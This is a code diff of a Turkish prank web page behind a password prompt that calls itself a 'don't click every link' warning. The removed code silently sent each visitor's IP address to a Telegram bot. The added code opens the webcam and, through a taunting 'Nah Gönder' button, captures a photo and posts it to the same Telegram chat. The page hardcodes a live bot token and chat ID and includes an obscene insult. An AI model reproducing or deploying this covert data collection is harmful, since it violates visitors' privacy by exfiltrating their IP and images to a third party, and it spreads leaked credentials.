@@ -2,58 +2,46 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Giriş</title>
+  <title>Ayık Ol</title>
   <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
       background-color: black;
       color: white;
       font-family: 'Russo One', sans-serif;
-      height: 100vh;
       display: flex;
-      justify-content: center;
-      align-items: center;
       flex-direction: column;
-    }
-
-    #girisEkrani, #ayikOl, #hataMesaji {
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
       text-align: center;
     }
-
-    #ayikOl {
-      font-size: 70px;
-      color: red;
-      display: none;
-    }
-
     #hataMesaji {
       display: none;
-      font-size: 30px;
+      font-size: 28px;
       color: red;
       animation: yanipSonme 0.5s infinite;
     }
-
     @keyframes yanipSonme {
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
     }
-
-    input[type="password"] {
-      font-size: 20px;
-      padding: 10px;
-      margin: 20px 0;
+    #ayikOl, #nahGonder, #kamera {
+      display: none;
     }
-
+    #ayikOl {
+      font-size: 60px;
+      color: red;
+      margin-bottom: 10px;
+    }
     button {
       font-size: 18px;
       padding: 10px 20px;
+      margin-top: 20px;
       cursor: pointer;
+    }
+    video {
+      display: none;
     }
   </style>
 </head>
@@ -67,38 +55,64 @@
   </div>
 
   <div id="ayikOl">AYIK OL<br><span style="font-size: 18px; color: orange;">her linke tıklama</span></div>
+
   <div id="hataMesaji">Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.</div>
 
+  <video id="kamera" autoplay playsinline></video>
+  <button id="nahGonder" onclick="fotoGonder()">Nah Gönder</button>
+  <div id="gonderildi" style="display:none; margin-top:10px; color:lightgreen;">📸 Gönderildi!</div>
+
   <script>
+    const botToken = "8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g";
+    const chatId = "7791726274";
+
     function kontrolEt() {
       const sifre = document.getElementById("sifreInput").value;
       if (sifre === "671300") {
         document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("ayikOl").style.display = "block";
+        document.getElementById("kamera").style.display = "block";
+        document.getElementById("nahGonder").style.display = "inline-block";
 
-        // IP alma ve Telegram'a gönderme
-        fetch("https://api.ipify.org?format=json")
-          .then(res => res.json())
-          .then(data => {
-            const ip = data.ip;
-            const botToken = "8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g";
-            const chatId = "7791726274";
-            const message = `📡 Yeni Ziyaretçi IP: ${ip}`;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-              })
-            });
+        // Kamera aç
+        const video = document.getElementById('kamera');
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+          })
+          .catch(err => {
+            console.error("Kamera açılamadı:", err);
           });
+
       } else {
+        document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("hataMesaji").style.display = "block";
       }
+    }
+
+    function fotoGonder() {
+      const video = document.getElementById('kamera');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "foto.jpg");
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).then(() => {
+          document.getElementById("nahGonder").style.display = "none";
+          document.getElementById("gonderildi").style.display = "block";
+        }).catch(err => {
+          console.error("Foto gönderilemedi:", err);
+        });
+      }, 'image/jpeg');
     }
   </script>
 
